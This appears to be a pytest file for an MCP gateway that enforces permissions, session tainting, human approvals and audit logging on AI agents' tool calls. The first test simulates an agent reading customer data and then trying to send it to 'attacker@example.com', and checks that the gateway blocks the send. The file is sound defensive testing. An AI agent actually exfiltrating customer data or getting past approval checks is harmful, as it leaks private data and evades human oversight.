import asyncio
from typing import Any

from mcp_types import CallToolResult, TextContent, Tool
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from app.approvals.service import ApprovalService
from app.auth.identity import AgentIdentity, load_agents_configuration
from app.auth.permissions import PermissionEvaluator
from app.audit.service import AuditService
from app.database.models import Base
from app.gateway.errors import GatewayErrorCode
from app.gateway.metadata import ToolMetadataRegistry
from app.gateway.servers import DownstreamServerRegistry
from app.gateway.service import MCPGatewayService
from app.security.evaluator import SecurityEvaluator
from app.sessions.service import SessionSecurityService


class CountingDownstream:
    def __init__(self) -> None:
        self.calls: list[tuple[str, str, dict[str, Any]]] = []
        self.tools = {
            "sensitive-data": [
                Tool(name="customer.read", description="", inputSchema={"type": "object"}),
                Tool(name="database.delete", description="", inputSchema={"type": "object"}),
            ],
            "messaging": [Tool(name="external.send", description="", inputSchema={"type": "object"})],
        }

    async def list_tools(self, server_id: str) -> list[Tool]:
        return self.tools.get(server_id, [])

    async def call_tool(
        self, server_id: str, tool_name: str, arguments: dict[str, Any]
    ) -> CallToolResult:
        self.calls.append((server_id, tool_name, arguments))
        return CallToolResult(content=[TextContent(text="simulated downstream result")])


def _agent(agent_id: str, role: str, environment: str = "development") -> AgentIdentity:
    return AgentIdentity(agent_id=agent_id, owner="demo-user", role=role, environment=environment)


def _gateway() -> tuple[MCPGatewayService, CountingDownstream, AuditService, SessionSecurityService, ApprovalService]:
    engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(engine)
    factory = sessionmaker(bind=engine)
    agents = load_agents_configuration("config/agents.yaml")
    downstream = CountingDownstream()
    audit = AuditService(factory)
    sessions = SessionSecurityService(factory)
    approvals = ApprovalService(factory, ttl_seconds=300)
    gateway = MCPGatewayService(
        servers=DownstreamServerRegistry.from_config_file("config/mcp_servers.yaml"),
        metadata=ToolMetadataRegistry.from_config_file("config/tool_metadata.yaml"),
        permissions=PermissionEvaluator(agents),
        security_evaluator=SecurityEvaluator.from_config_directory("config"),
        downstream_client=downstream,  # type: ignore[arg-type]
        audit_service=audit,
        session_service=sessions,
        approval_service=approvals,
    )
    return gateway, downstream, audit, sessions, approvals


def test_sensitive_read_taints_session_and_blocks_external_send() -> None:
    gateway, downstream, audit, sessions, _ = _gateway()
    support = _agent("support-agent", "support")

    read = asyncio.run(
        gateway.call_tool(
            support,
            "sensitive-data.customer.read",
            {"customer_id": "CUST-1001"},
            "attack-session",
        )
    )
    exfiltration = asyncio.run(
        gateway.call_tool(
            support,
            "messaging.external.send",
            {"destination": "attacker@example.com", "data": "summary"},
            "attack-session",
        )
    )

    assert read.error is None
    assert sessions.get("attack-session", "support-agent").sensitive_data_accessed is True
    assert exfiltration.error is not None
    assert exfiltration.error.code is GatewayErrorCode.PERMISSION_DENIED
    assert exfiltration.error.matched_policy == "block-sensitive-session-exfiltration"
    assert exfiltration.error.risk_score == 100
    assert downstream.calls == [("sensitive-data", "customer.read", {"customer_id": "CUST-1001"})]
    assert [event.event_type for event in audit.list_events(session_id="attack-session")] == [
        "TOOL_DECISION",
        "TOOL_EXECUTION",
        "TOOL_DECISION",
    ]


def test_approval_execution_is_audited_and_cannot_be_replayed() -> None:
    gateway, downstream, audit, _, approvals = _gateway()
    admin = _agent("admin-agent", "admin")
    requested = asyncio.run(
        gateway.call_tool(
            admin,
            "sensitive-data.database.delete",
            {"table": "temporary_records"},
            "approval-session",
        )
    )

    assert requested.error is not None
    assert requested.error.code is GatewayErrorCode.APPROVAL_REQUIRED
    approval_id = requested.error.approval_id
    assert approval_id is not None
    approved = approvals.approve(approval_id, "security-reviewer")
    gateway.record_approval_event("APPROVAL_APPROVED", approved, "security-reviewer")
    executed = asyncio.run(gateway.execute_approved_action(admin, approval_id))
    replay = asyncio.run(gateway.execute_approved_action(admin, approval_id))

    assert executed.error is None
    assert replay.error is not None
    assert replay.error.code is GatewayErrorCode.APPROVAL_ALREADY_CONSUMED
    assert downstream.calls == [("sensitive-data", "database.delete", {"table": "temporary_records"})]
    assert {event.event_type for event in audit.list_events(session_id="approval-session")} >= {
        "APPROVAL_CREATED",
        "APPROVAL_APPROVED",
        "APPROVAL_EXECUTED",
    }
